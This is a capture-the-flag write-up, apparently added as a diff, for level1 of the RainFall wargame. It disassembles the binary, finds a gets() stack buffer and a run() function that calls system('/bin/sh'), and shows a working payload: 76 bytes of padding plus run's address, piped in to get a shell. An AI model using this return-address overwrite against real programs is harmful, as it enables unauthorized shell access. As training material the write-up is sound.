@@ -1,0 +1,100 @@
+# Level1
+
+---
+
+# 1
+
+execute the program:
+
+```asm
+level1@RainFall:~$ ./level1
+qwelqweq
+level1@RainFall:~$
+
+level1@RainFall:~$ ./level1 kwer
+qweqwe
+level1@RainFall:~$
+
+level1@RainFall:~$ python -c 'print("A"*76)' | ./level1
+Illegal instruction (core dumped)
+level1@RainFall:~$
+
+level1@RainFall:~$ python -c 'print("A"*100)' | ./level1
+Segmentation fault (core dumped)
+level1@RainFall:~$
+
+```
+
+we can see that the program is starting without arguments and wait until user gives entry.
+76 chars arguments create a sigill signal.
+100 chars arguments create segfault signal.
+
+# 2
+
+using objdump -M intel -d level1
+
+Shows 3 things:
+- the main function is really small:
+```
+08048480 <main>:
+ 8048480:       55                      push   ebp
+ 8048481:       89 e5                   mov    ebp,esp
+ 8048483:       83 e4 f0                and    esp,0xfffffff0
+ 8048486:       83 ec 50                sub    esp,0x50					-> substraction 80 to stack pointer (buffer size)
+ 8048489:       8d 44 24 10             lea    eax,[esp+0x10]
+ 804848d:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
+ 8048495:       c9                      leave
+ 8048496:       c3                      ret
+ 8048497:       90                      nop
+ 8048498:       90                      nop
+ 8048499:       90                      nop
+ 804849a:       90                      nop
+ 804849b:       90                      nop
+ 804849c:       90                      nop
+ 804849d:       90                      nop
+ 804849e:       90                      nop
+ 804849f:       90                      nop
+```
+
+- then is a run function calling system and settings 0x8048584 addr (after printing it with gdb it shows "/bin/sh"):
+```
+08048444 <run>:
+ 8048444:       55                      push   ebp
+ 8048445:       89 e5                   mov    ebp,esp
+ 8048447:       83 ec 18                sub    esp,0x18
+ 804844a:       a1 c0 97 04 08          mov    eax,ds:0x80497c0
+ 804844f:       89 c2                   mov    edx,eax
+ 8048451:       b8 70 85 04 08          mov    eax,0x8048570
+ 8048456:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
+ 804845a:       c7 44 24 08 13 00 00    mov    DWORD PTR [esp+0x8],0x13
+ 8048461:       00
+ 8048462:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
+ 8048469:       00
+ 804846a:       89 04 24                mov    DWORD PTR [esp],eax
+ 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
+ 8048472:       c7 04 24 84 85 04 08    mov    DWORD PTR [esp],0x8048584
+ 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
+ 804847e:       c9                      leave
+ 804847f:       c3                      ret
+```
+
+
+# 3
+
+So after all those information my attack flow would be to find a way to access the function run.
+For that i need overwrite the return addr of main and set the run addr into it and make this function run play.
+In main i can clearly see that the size of the buffer is about 76. so over 76 im actually doing a buffer overflow.
+
+# 4. Redirecting execution to `run()`
+
+```bash
+python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/sc
+(cat /tmp/sc; cat) | ./level1
+```
+
+The first command generates 76 `A` characters followed by the address of the `run()` function (`0x08048444`). The address is encoded in little-endian byte order, as expected on this 32-bit x86 system.
+
+The 76 characters overwrite the data between the start of the input buffer and the saved return address. The address that follows overwrites that return address, redirecting execution to `run()` when `main()` returns.
+
+The second command pipes the contents of `/tmp/sc` into `level1`. The first `cat` sends the prepared input, while the second `cat` keeps reading from standard input, allowing further input to be sent to the program's input stream if the spawned shell inherits it.
